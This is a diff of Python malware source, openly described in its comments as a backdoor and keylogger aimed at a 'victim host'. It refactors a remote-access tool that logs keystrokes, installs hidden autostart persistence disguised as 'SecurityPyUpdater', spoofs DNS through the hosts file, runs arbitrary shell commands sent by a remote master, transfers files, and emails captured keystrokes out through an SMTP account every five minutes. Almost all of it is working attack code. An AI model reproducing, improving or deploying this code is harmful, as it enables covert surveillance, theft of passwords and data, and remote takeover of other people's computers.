@@ -5,9 +5,7 @@
 # Written By Ananke: https://github.com/4n4nk3
 import base64
 import os
-import random
 import socket
-import string
 import subprocess
 import sys
 import tempfile
@@ -19,6 +17,9 @@ from tendo import singleton
 from pathlib import Path
 # pycrypto
 from Crypto.Cipher import AES
+# mailer
+import smtplib
+from email.mime.text import MIMEText
 
 # Importing module for autostart written by Jonas Wagner
 # http://29a.ch/2009/3/17/autostart-autorun-with-python
@@ -33,8 +34,9 @@ persistenceactivation = False
 global platform
 global thr_block
 global thr_exit
+global username
 
-# I understand on wich system I am and then I import the corrects modules for the keylogger
+# I understand on which system I am and then I import the corrects modules for the keylogger
 if os.name == 'nt':
     platform = 'windows'
     import pythoncom
@@ -68,7 +70,8 @@ def persistence_install() -> bool:
             # Try to hide file adding hidden attribute to it
             try:
                 subprocess.check_call(["attrib", "+H", target_to_autostart])
-            except:
+            except Exception as exception:
+                print(exception)
                 return False
         else:
             # Give executable permission to file
@@ -76,7 +79,8 @@ def persistence_install() -> bool:
                 subprocess.Popen('chmod 700 ' + target_to_autostart, shell=True, stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE,
                                  stdin=subprocess.PIPE)
-            except:
+            except Exception as exception:
+                print(exception)
                 return False
         autorun.add('SecurityPyUpdater', target_to_autostart)
         return True
@@ -134,7 +138,7 @@ def sender(data_to_send: str) -> None:
     s.send(encoded)
 
 
-def command_executer(command: str):
+def command_executor(command: str):
     """Execute a command in the system shell ans send its output to the master.\n"""
     try:
         proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
@@ -149,9 +153,9 @@ def command_executer(command: str):
 def listprocesses():
     """List running processes.\n"""
     if platform == 'windows':
-        command_executer('tasklist')
+        command_executor('tasklist')
     else:
-        command_executer('pstree -u -p')
+        command_executor('pstree -u -p')
 
 
 def killprocesses():
@@ -162,9 +166,9 @@ def killprocesses():
         sender('Insert process PID\n')
     process_id = receiver()
     if platform == 'windows':
-        command_executer('TASKKILL /IM ' + process_id + ' /F /T')
+        command_executor('TASKKILL /IM ' + process_id + ' /F /T')
     else:
-        command_executer('kill -9 ' + process_id)
+        command_executor('kill -9 ' + process_id)
 
 
 def dnsspoofer(dnsfile: str):
@@ -175,12 +179,12 @@ def dnsspoofer(dnsfile: str):
     evil_address = receiver()
     if os.access(dnsfile, os.W_OK):
         try:
-            f = open(dnsfile, 'r')
-            original_hosts_file = f.read()
-            f.close()
-            f = open(dnsfile, 'w')
-            f.write(original_hosts_file + '\n' + evil_address + '    ' + orig_address)
-            f.close()
+            f_spoof = open(dnsfile, 'r')
+            original_hosts_file = f_spoof.read()
+            f_spoof.close()
+            f_spoof = open(dnsfile, 'w')
+            f_spoof.write(original_hosts_file + '\n' + evil_address + '    ' + orig_address)
+            f_spoof.close()
             sender('Operation completed\n')
         except Exception as exception:
             sender(str(exception))
@@ -192,12 +196,12 @@ def dnscleaner(dnsfile: str, dnsbackup: str, send=False):
     """Restore original hosts file from backup made at shell startup.\n"""
     if os.access(dnsfile, os.W_OK):
         try:
-            f = open(dnsbackup, 'r')
-            buffer = f.read()
-            f.close()
-            f = open(dnsfile, 'w')
-            f.write(buffer)
-            f.close()
+            f_clean = open(dnsbackup, 'r')
+            buffer = f_clean.read()
+            f_clean.close()
+            f_clean = open(dnsfile, 'w')
+            f_clean.write(buffer)
+            f_clean.close()
             if send is True:
                 sender('DNS cleaned\n')
         except Exception as exception:
@@ -234,17 +238,17 @@ def keylogs_stop():
         sender('Keylogger is not running!\n')
 
 
-def keylogs_download(keylogfile: str):
+def keylogs_download(keylogfile_dow: str):
     """Send keylogged data to the master and delete it from victim host.\n"""
     try:
-        with open(keylogfile, 'rb') as f:
-            keylogged_data = base64.b64decode(f.read()).decode('utf-8')
+        with open(keylogfile_dow, 'rb') as f_kd:
+            keylogged_data = base64.b64decode(f_kd.read()).decode('utf-8')
         sender(keylogged_data + '\n')
     except Exception as exception:
         sender('reachedexcept')
         sender(str(exception))
     try:
-        cleaner = open(keylogfile, 'w')
+        cleaner = open(keylogfile_dow, 'w')
         cleaner.write('')
         cleaner.close()
     except Exception as exception:
@@ -257,9 +261,9 @@ def downloader():
     try:
         file_name = os.path.normcase(receiver())
         # Reading file in binary form
-        f = open(file_name, 'rb')
-        a = f.read()
-        f.close()
+        f_dow = open(file_name, 'rb')
+        a = f_dow.read()
+        f_dow.close()
     except Exception as exception:
         sender('reachedexcept')
         a = str(exception)
@@ -289,7 +293,7 @@ def uploader():
 # =================================================================================================
 
 # Defining correct keylogging procedure
-def keylogger(fd_temp: int, keylogfile: str):
+def keylogger(fd_temp_key: int, keylogfile_key: str):
     """Key logger thread.\n"""
 
     def OnKeyboardEvent(event):
@@ -297,32 +301,32 @@ def keylogger(fd_temp: int, keylogfile: str):
         if not thr_block.isSet():
             if event.Ascii != 0 or 8:
                 # Use base64 and not an encryption just for performance
-                with open(keylogfile, 'r+b') as f:
-                    data_decoded = base64.b64decode(f.read()).decode('utf-8')
-                    f.seek(0)
+                with open(keylogfile_key, 'r+b') as f_key:
+                    data_decoded = base64.b64decode(f_key.read()).decode('utf-8')
+                    f_key.seek(0)
                     if event.Key == 'space':
                         data_decoded += ' '
-                        f.write(base64.b64encode(data_decoded.encode('utf-8')))
+                        f_key.write(base64.b64encode(data_decoded.encode('utf-8')))
                     elif event.Key == 'BackSpace':
                         data_decoded += '[BackSpace]'
-                        f.write(base64.b64encode(data_decoded.encode('utf-8')))
+                        f_key.write(base64.b64encode(data_decoded.encode('utf-8')))
                     elif event.Key == 'Return':
                         data_decoded += '[Enter]'
-                        f.write(base64.b64encode(data_decoded.encode('utf-8')))
+                        f_key.write(base64.b64encode(data_decoded.encode('utf-8')))
                     elif event.Key == 'Shift_L':
                         data_decoded += '[Shift_L]'
-                        f.write(base64.b64encode(data_decoded.encode('utf-8')))
+                        f_key.write(base64.b64encode(data_decoded.encode('utf-8')))
                     elif event.Key == 'Shift_R':
                         data_decoded += '[Shift_R]'
-                        f.write(base64.b64encode(data_decoded.encode('utf-8')))
+                        f_key.write(base64.b64encode(data_decoded.encode('utf-8')))
                     elif event.Key == 'Tab':
                         data_decoded += '[Tab]'
-                        f.write(base64.b64encode(data_decoded.encode('utf-8')))
+                        f_key.write(base64.b64encode(data_decoded.encode('utf-8')))
                     else:
                         data_decoded += event.Key
-                        f.write(base64.b64encode(data_decoded.encode('utf-8')))
+                        f_key.write(base64.b64encode(data_decoded.encode('utf-8')))
         if thr_exit.isSet():
-            os.close(fd_temp)
+            os.close(fd_temp_key)
             sys.exit(0)
         return True
 
@@ -344,47 +348,42 @@ def keylogger(fd_temp: int, keylogfile: str):
 
 # =================================================================================================
 
-if mailactivation is True:
-    import smtplib
-    from email.mime.text import MIMEText
+def mailsender(keylogfile_mail: str):
+    """Thread to send keylogged data via email every 5 minutes (300 seconds).\n"""
+    user_name = 'name'
+    password = 'password'
 
+    sender_email = 'sender@yahoo.it'
+    receiver_email = 'reciver@yahoo.it'
 
-    def mailsender(keylogfile: str):
-        """Thread to send keylogged data via email evry 5 minutes (300 seconds).\n"""
-        username = 'name'
-        password = 'password'
-
-        sender_email = 'sender@yahoo.it'
-        receiver_email = 'reciver@yahoo.it'
-
-        msg['Subject'] = 'Logged keystrokes'
-        msg['From'] = sender_email
-        msg['To'] = receiver_email
-
-        while 1:
-            time.sleep(300)
-            if not thr_block.isSet():
-                try:
-                    fo = open(keylogfile, 'r')
-                    msg = MIMEText(fo.read())
-                    fo.close()
-                except Exception as exception:
-                    print(exception)
-                try:
-                    mail_socket = smtplib.SMTP_SSL('smtp.mail.yahoo.com:465')
-                    mail_socket.login(username, password)
-                    mail_socket.sendmail(sender_email, [receiver_email], msg.as_string())
-                    mail_socket.close()
-                    print('Successfully sent email')
-                except Exception as exception:
-                    print(exception)
+    while 1:
+        time.sleep(300)
+        if not thr_block.isSet():
+            try:
+                fo = open(keylogfile_mail, 'r')
+                msg = MIMEText(fo.read())
+                fo.close()
+                msg['Subject'] = 'Logged keystrokes'
+                msg['From'] = sender_email
+                msg['To'] = receiver_email
+            except Exception as exception:
+                print(exception)
+            try:
+                mail_socket = smtplib.SMTP_SSL('smtp.mail.yahoo.com:465')
+                mail_socket.login(user_name, password)
+                # noinspection PyUnboundLocalVariable
+                mail_socket.sendmail(sender_email, [receiver_email], msg.as_string())
+                mail_socket.close()
+                print('Successfully sent email')
+            except Exception as exception:
+                print(exception)
 
 
 # =================================================================================================
 
-def backdoor(mailactivation: bool, keylogfile: str):
+def backdoor(mailactivation_bd: bool, keylogfile_bd: str):
     """Shell thread that connect to master and permit control over the agent.\n"""
-    host = '127.0.0.1'  # Remote host to wich you want the backdoor to connect to
+    host = '127.0.0.1'  # Remote host to which you want the backdoor to connect to
     port = 4444  # The connection port to use
 
     # Defining global the variables that I need to use in many different functions
@@ -392,9 +391,10 @@ def backdoor(mailactivation: bool, keylogfile: str):
     global cipher
     global EncodeAES
     global DecodeAES
+    global username
 
     # Creating the socket
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    first_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     if platform == 'windows':
         dnsfile = os.getenv('WINDIR') + os.path.normcase('/system32/drivers/etc/hosts')
@@ -404,18 +404,18 @@ def backdoor(mailactivation: bool, keylogfile: str):
         dnsbackup = tempfile.gettempdir() + '/spoofbackup'
 
     # Backing up Hosts file
-    f = open(dnsfile, 'r')
-    buffer = f.read()
-    f.close()
-    f = open(dnsbackup, 'w')
-    f.write(buffer)
-    f.close()
+    f_bd = open(dnsfile, 'r')
+    buffer = f_bd.read()
+    f_bd.close()
+    f_bd = open(dnsbackup, 'w')
+    f_bd.write(buffer)
+    f_bd.close()
 
-    # Setting parameters required for crypting comunications
+    # Setting parameters required for crypting communications
     block_size = 32
     padding = '{'
-    pad = lambda s: s + (block_size - len(s) % block_size) * padding
-    EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
+    pad = lambda y: y + (block_size - len(y) % block_size) * padding
+    EncodeAES = lambda c, y: base64.b64encode(c.encrypt(pad(y)))
     DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).decode('utf-8').rstrip(padding)
     # Setting password for crypting packets
     secret = '4n4nk353hlli5w311d0n3andI1ik3it!'
@@ -426,13 +426,39 @@ def backdoor(mailactivation: bool, keylogfile: str):
     while 1:
         try:
             # Connecting to the client
-            s.connect((host, port))
+            first_s.connect((host, port))
             # Sending information relatives to the infected system
-            proc = subprocess.Popen('whoami', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                    stdin=subprocess.PIPE)
-            a = (proc.stdout.read() + proc.stderr.read()).decode('utf-8')
-            s.send(str.encode('Logged in as: {}'.format(a)))
-            print('Connection successfull')
+            proc = subprocess.run(['whoami'], check=True, stdout=subprocess.PIPE, universal_newlines=True)
+            username = proc.stdout.split()[0]
+            # First time i send username
+            encoded = EncodeAES(cipher, username)
+            length = str(len(encoded))
+            length_crypt = EncodeAES(cipher, length)
+            # Sending the length and wait. Then send data
+            first_s.send(length_crypt)
+            time.sleep(1)
+            first_s.send(encoded)
+            print('Connection successful')
+            lengthcrypt = first_s.recv(1024)
+            expected_length = int(DecodeAES(cipher, lengthcrypt))
+            encrypted_received_data = ''
+            while len(encrypted_received_data) < expected_length:
+                encrypted_received_data += first_s.recv(1024).decode('utf-8')
+            new_port = int(DecodeAES(cipher, encrypted_received_data))
+            print('New port is gonna be {}'.format(new_port))
+            time.sleep(5)
+            first_s.close()
+            # Connecting to the client on the new port
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((host, new_port))
+            # Sending information relatives to the infected system
+            encoded = EncodeAES(cipher, username)
+            length = str(len(encoded))
+            length_crypt = EncodeAES(cipher, length)
+            # Sending the length and wait. Then send data
+            s.send(length_crypt)
+            time.sleep(1)
+            s.send(encoded)
             break
         # If i cannot connect I wait 2 minutes and then I retry
         except Exception as exception:
@@ -449,49 +475,50 @@ def backdoor(mailactivation: bool, keylogfile: str):
     # Commands loop
     while 1:
         received_command = receiver()
-        if received_command == 'SHquit':
-            sender('mistochiudendo')
-            break
-        elif received_command == 'SHprocesslist':
-            listprocesses()
-        elif received_command == 'SHprocesskill':
-            killprocesses()
-        elif received_command == 'SHdnsstart':
-            dnsspoofer(dnsfile)
-        elif received_command == 'SHdnsstop':
-            if cmp(dnsfile, dnsbackup) is False:
-                dnscleaner(dnsfile, dnsbackup, send=True)
+        if received_command != 'KeepAlive':
+            if received_command == 'SHquit':
+                sender('mistochiudendo')
+                break
+            elif received_command == 'SHprocesslist':
+                listprocesses()
+            elif received_command == 'SHprocesskill':
+                killprocesses()
+            elif received_command == 'SHdnsstart':
+                dnsspoofer(dnsfile)
+            elif received_command == 'SHdnsstop':
+                if cmp(dnsfile, dnsbackup) is False:
+                    dnscleaner(dnsfile, dnsbackup, send=True)
+                else:
+                    sender('Original hosts file and current one are the same! Nothing to change.')
+            elif received_command == 'SHdownload':
+                downloader()
+            elif received_command == 'SHupload':
+                uploader()
+            elif received_command == 'SHkeylogstatus':
+                keylogs_status()
+            elif received_command == 'SHkeylogstart':
+                keylogs_start()
+            elif received_command == 'SHkeylogstop':
+                keylogs_stop()
+            elif received_command == 'SHkeylogdownload':
+                keylogs_download(keylogfile_bd)
+            elif received_command == 'SHpersistenceenable':
+                if persistence_install():
+                    sender('Persistence installation successful!')
+                else:
+                    sender('Persistence already installed!')
+            elif received_command == 'SHpersistencedisable':
+                if persistence_remove():
+                    sender('Persistence remove successful!')
+                else:
+                    sender('Persistence not yet installed!')
+            elif received_command == 'SHpersistencestatus':
+                if persistence_status():
+                    sender('Persistence is installed.')
+                else:
+                    sender('Persistence is not installed.')
             else:
-                sender('Original hosts file and current one are the same! Nothing to change.')
-        elif received_command == 'SHdownload':
-            downloader()
-        elif received_command == 'SHupload':
-            uploader()
-        elif received_command == 'SHkeylogstatus':
-            keylogs_status()
-        elif received_command == 'SHkeylogstart':
-            keylogs_start()
-        elif received_command == 'SHkeylogstop':
-            keylogs_stop()
-        elif received_command == 'SHkeylogdownload':
-            keylogs_download(keylogfile)
-        elif received_command == 'SHpersistenceenable':
-            if persistence_install():
-                sender('Persistence installation succesfull!')
-            else:
-                sender('Persistence already installed!')
-        elif received_command == 'SHpersistencedisable':
-            if persistence_remove():
-                sender('Persistence remove successful!')
-            else:
-                sender('Persistence not yet installed!')
-        elif received_command == 'SHpersistencestatus':
-            if persistence_status():
-                sender('Persistence is installed.')
-            else:
-                sender('Persistence is not installed.')
-        else:
-            command_executer(received_command)
+                command_executor(received_command)
 
     # Recreating original hosts file of the system
     if cmp(dnsfile, dnsbackup) is False:
@@ -504,7 +531,7 @@ def backdoor(mailactivation: bool, keylogfile: str):
     s.close()
     print('Connection closed')
     # If thr_exit.set() next keystroke will terminate keylogger thread
-    if mailactivation is False:
+    if mailactivation_bd is False:
         thr_exit.set()
     return True
 
@@ -516,16 +543,13 @@ thr_exit = threading.Event()
 thread1 = threading.Thread(name='sic1', target=keylogger, args=(fd_temp, keylogfile)).start()
 # Backdoor's thread
 thread2 = threading.Thread(name='sic2', target=backdoor, args=(mailactivation, keylogfile)).start()
-# If mailactivation setted I define the mailsender thread
+# If mailactivation is True I define the mailsender thread
 if mailactivation is True:
     thread3 = threading.Thread(name='sic3', target=mailsender, args=keylogfile).start()
 
 # TODO: Split source in modules
-
 # TODO: Configure/Enable/Disable mail activation from shell cmd
-
 # TODO: Keylogger add clipboard (trigger on ctrl+c and ctrl+v)
-
 # TODO: Add active window recognition
 # TODO: Add screenshooter
 # TODO: Add Webcam and microphone
